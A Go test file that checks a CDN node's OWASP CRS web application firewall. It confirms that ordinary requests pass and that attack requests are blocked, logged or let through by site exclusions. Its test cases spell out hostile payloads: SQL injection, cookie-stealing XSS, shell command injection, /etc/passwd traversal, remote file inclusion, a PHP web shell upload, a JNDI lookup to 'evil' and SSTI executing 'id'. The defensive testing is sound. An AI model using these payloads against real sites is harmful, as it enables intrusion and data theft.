package main

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"

	"github.com/cdnca/cdnca/libs/edgeconfig/edgesite"
)

// catalogRun is the OWASP CRS request catalog of the retired v7 rule
// enforcement probe (WAF block mode, all rule sets,
// log-only mode, site exclusions) on a dynamic routing node: what CRS
// PL1 blocks and what normal traffic passes, per request family.
//   - w: PL1 block            l: PL1 observe-only (log)
//   - r: PL1, excludes 941160/941310 (rich text; PA-12 site exclusions)
//   - p: PL2 (system/crs-pl1 covers SQLi, XSS, upload, LFI and command
//     injection only; PHP, Java, SSTI and RFI wrappers are PL2 rules)
func catalogRun() {
	all := profiles()
	pl1, pl2, observe := profileNamed(all, "system/crs-pl1"), profileNamed(all, "system/crs-pl2"), profileNamed(all, "system/crs-pl1-log")
	sites := []edgesite.Site{
		makeSite(1, "w.catalog.test", &wafSpec{profile: pl1}),
		makeSite(2, "l.catalog.test", &wafSpec{profile: observe}),
		makeSite(3, "r.catalog.test", &wafSpec{profile: pl1, exclusions: []int{941160, 941310}}),
		makeSite(4, "p.catalog.test", &wafSpec{profile: pl2}),
	}
	if _, err := startNode(sites, true); err != nil {
		check("catalog-start", false, "%v", err)
		return
	}
	defer stop()
	const w, l, r, p = "w.catalog.test", "l.catalog.test", "r.catalog.test", "p.catalog.test"
	richText := `<p>你好 <b>世界</b></p><p><img src="https://example.com/a.png" alt="图"></p>`
	png := "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
	cases := []catalogCase{
		// normal traffic passes (false positives)
		{"OK-query", w, getPath("/?q=hello+world"), 200},
		{"OK-apostrophe", w, getPath("/?name=O%27Brien"), 200},
		{"OK-words", w, getPath("/?q=select+a+card+or+union+membership"), 200},
		{"OK-article", w, getPath("/search?q=how+to+use+SELECT+in+SQL"), 200},
		{"OK-json", w, post("/api", "application/json", `{"comment":"I'd like 2 items -- thanks"}`), 200},
		{"OK-form", w, form("/form", "user", "alice", "bio", "Tom & Jerry fan"), 200},
		{"OK-url", w, getPath("/?url=https%3A%2F%2Fexample.com%2Fa%3Fb%3D1"), 200},
		{"OK-system", w, getPath("/news/2024/a.html?q=system+requirements"), 200},
		{"OK-nested-json", w, post("/api", "application/json", `{"a":{"b":[1,2]}}`), 200},
		{"OK-chinese-form", w, form("/signup", "name", "张三", "addr", "北京市朝阳区建国路 88 号"), 200},
		{"OK-png-upload", w, upload("/upload", "avatar", "a.png", "image/png", png), 200},
		{"OK-xml", w, post("/soap", "text/xml", `<?xml version="1.0"?><order><user>王五</user><qty>3</qty></order>`), 200},
		{"OK-php-uri", w, getPath("/upload/shell.php"), 200},
		// attacks are blocked
		{"SQLI-or", w, getPath("/?id=1%27%20OR%20%271%27%3D%271"), 403},
		{"SQLI-comment", w, getPath("/?id=1%27%20OR%201%3D1--%20-"), 403},
		{"SQLI-union", w, getPath("/?id=1%20UNION%20SELECT%20username,password%20FROM%20users"), 403},
		{"SQLI-double-encoded", w, getPath("/?id=1%2527%2520OR%25201%253D1--"), 403},
		{"SQLI-mixed-case", w, getPath("/?id=1%27/**/UnIoN/**/SeLeCt/**/1,2--"), 403},
		{"SQLI-stacked", w, getPath("/?id=1;%20DROP%20TABLE%20users--"), 403},
		{"SQLI-sleep", w, getPath("/?id=1%27%20AND%20SLEEP(5)--"), 403},
		{"SQLI-form", w, form("/login", "user", "admin' OR 1=1--", "pass", "x"), 403},
		{"SQLI-json", w, post("/api", "application/json", `{"id":"1 UNION SELECT password FROM users"}`), 403},
		{"XSS-script", w, getPath("/?q=%3Cscript%3Ealert(1)%3C/script%3E"), 403},
		{"XSS-onerror", w, getPath("/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"), 403},
		{"XSS-javascript", w, getPath("/?next=javascript:alert(1)"), 403},
		{"XSS-double-encoded", w, getPath("/?q=%253Csvg%252Fonload%253Dalert(1)%253E"), 403},
		{"XSS-form-iframe", w, form("/comment", "body", "<iframe src=//evil>"), 403},
		{"CMD-semicolon", w, getPath("/?c=1%3Bcat%20/etc/hosts"), 403},
		{"CMD-subshell", w, getPath("/?c=%24(whoami)"), 403},
		{"LFI-passwd", w, getPath("/download?file=../../../../etc/passwd"), 403},
		{"RFI-php-wrapper", p, getPath("/?page=php://filter/resource=index"), 403},
		{"RFI-ip-url", w, getPath("/?page=http://203.0.113.9/shell.txt?"), 403},
		{"UPLOAD-php", w, upload("/upload", "file", "shell.php", "image/png", `<?php system($_GET["c"]); ?>`), 403},
		{"JAVA-jndi", w, getPath("/?x=%24%7Bjndi:ldap://evil/a%7D"), 403},
		{"JAVA-exec", p, getPath("/?x=java.lang.Runtime.getRuntime().exec(1)"), 403},
		// one 944210 hit (PL2, critical 5) on 严格防护's two-level scoring
		// (CRS profile packs 1.2.0): strong 0, weak 5 < 10, the grey zone; no
		// waf_adapt entry, so no challenge and the request passes
		{"JSER-base64", p, getPath("/?d=rO0ABQ"), 200},
		{"PHP-function", p, getPath("/?x=system('id')"), 403},
		{"SSTI-jinja", p, getPath("/?n=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27id%27).read()%7D%7D"), 403},
		{"XML-sqli", w, post("/soap", "application/soap+xml", `<?xml version="1.0"?><q><id>1 UNION SELECT password FROM users</id></q>`), 403},
		{"RICH-unexcluded", w, form("/editor/save", "content", richText), 403},
		// log-only mode: the same attacks reach the origin
		{"LOG-sqli", l, getPath("/?id=1%27%20OR%20%271%27%3D%271"), 200},
		{"LOG-xss", l, getPath("/?q=%3Cscript%3Ealert(1)%3C/script%3E"), 200},
		// site exclusions drop only the excluded rules
		{"RICH-excluded", r, form("/editor/save", "content", richText), 200},
		{"RICH-onerror", r, form("/editor/save", "content", `<p>hi</p><img src=x onerror=alert(1)>`), 403},
		{"RICH-script", r, form("/editor/save", "content", `<script>alert(document.cookie)</script>`), 403},
	}
	mismatches := []string{}
	for _, c := range cases {
		if got := c.request(c.host); got != c.status {
			mismatches = append(mismatches, fmt.Sprintf("%s=%d want %d", c.name, got, c.status))
		}
	}
	check("catalog", len(mismatches) == 0, "%d CRS catalog requests (block / log-only / exclusions); mismatches %v", len(cases), mismatches)
}

type catalogCase struct {
	name    string
	host    string
	request func(host string) int
	status  int
}

func getPath(path string) func(string) int {
	return func(host string) int { return get(host, path) }
}

func post(path, contentType, body string) func(string) int {
	return func(host string) int {
		return do(client, http.MethodPost, host, path, strings.NewReader(body), map[string]string{"Content-Type": contentType})
	}
}

func form(path string, pairs ...string) func(string) int {
	values := url.Values{}
	for index := 0; index+1 < len(pairs); index += 2 {
		values.Set(pairs[index], pairs[index+1])
	}
	return func(host string) int {
		return do(client, http.MethodPost, host, path, strings.NewReader(values.Encode()), nil)
	}
}

func upload(path, field, filename, contentType, content string) func(string) int {
	return func(host string) int {
		var body bytes.Buffer
		writer := multipart.NewWriter(&body)
		header := make(map[string][]string)
		header["Content-Disposition"] = []string{fmt.Sprintf(`form-data; name=%q; filename=%q`, field, filename)}
		header["Content-Type"] = []string{contentType}
		part, _ := writer.CreatePart(header)
		_, _ = part.Write([]byte(content))
		_ = writer.Close()
		return do(client, http.MethodPost, host, path, &body, map[string]string{"Content-Type": writer.FormDataContentType()})
	}
}
